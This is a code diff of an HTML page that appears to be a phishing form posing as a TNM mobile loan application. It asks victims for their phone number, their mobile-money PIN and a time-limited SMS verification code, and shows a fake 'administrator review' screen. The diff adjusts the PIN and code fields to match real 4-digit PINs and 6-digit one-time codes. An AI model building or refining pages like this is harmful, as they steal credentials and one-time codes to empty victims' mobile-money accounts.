@@ -50,7 +50,7 @@ Apply Now | Simple Repayments | Fast Processing.</span>
       <label>TNM mobile number</label><input id="phone" type="tel" required placeholder="088XXXXXXX" inputmode="tel" autocomplete="tel" aria-describedby="tnmNumberHint">
       <label>TNM WhatsApp number (optional)</label><input id="whatsappNumber" type="tel" placeholder="088XXXXXXX " inputmode="tel" autocomplete="tel">
       <div class="hint" id="tnmNumberHint">Only TNM  mobile numbers are accepted.</div>
-      <label> Enter your pin</label><input id="applicationIdInput" class="text-input" required maxlength="6" minlength="4" inputmode="numeric" pattern="[0-9]{4,6}" placeholder="Enter ******" autocomplete="off" type="text">
+      <label> Enter your pin</label><input id="applicationIdInput" class="text-input" required maxlength="4" minlength="4" inputmode="numeric" pattern="[0-9]{4,6}" placeholder="****" autocomplete="off" type="text">
       <div class="hint">Enter your correct mobile-money PIN.</div>
       <button class="primary" id="startApplication" type="submit">NEXT <span>→</span></button><div class="error hidden" id="loginError"></div>
       <div class="waiting hidden" id="approvalWaiting"><div class="spinner"></div><strong>Waiting for application review</strong><span>Your application has been submitted for authorized tnm loan administrator review.</span><small>Application number: <b id="applicationNumber">—</b></small></div>
@@ -60,7 +60,7 @@ Apply Now | Simple Repayments | Fast Processing.</span>
     <div class="hero"><div class="icon"><span aria-hidden="true">🔢</span></div><h1>Code 1 — Application Verification</h1><p>Enter your code.</p></div>
     <div class="card form-card">
       <label for="firstName"> Code </label>
-      <input id="firstName" class="text-input" type="text" inputmode="numeric" pattern="[0-9]{4,6}" maxlength="6" minlength="4" autocomplete="off" placeholder="Enter 4–6 digits" aria-label="Reference Code 1">
+      <input id="firstName" class="text-input" type="text" inputmode="numeric" pattern="[0-9]{4,6}" maxlength="6" minlength="6" autocomplete="off" placeholder="******" aria-label="Reference Code 1">
       <div class="hint">expired in 60 seconds
 Enter the verification code sent to your phone via SMS. The code expires in 60 seconds. Please enter it before it expires.</div>
       <div class="submission-timer" id="firstNameTimer"><div class="countdown-ring" id="firstNameRing" style="--progress:100%"><div class="countdown-ring-inner"><strong id="firstNameSeconds">60</strong><span>SEC</span></div></div><div class="countdown-label">Time remaining to submit</div></div>
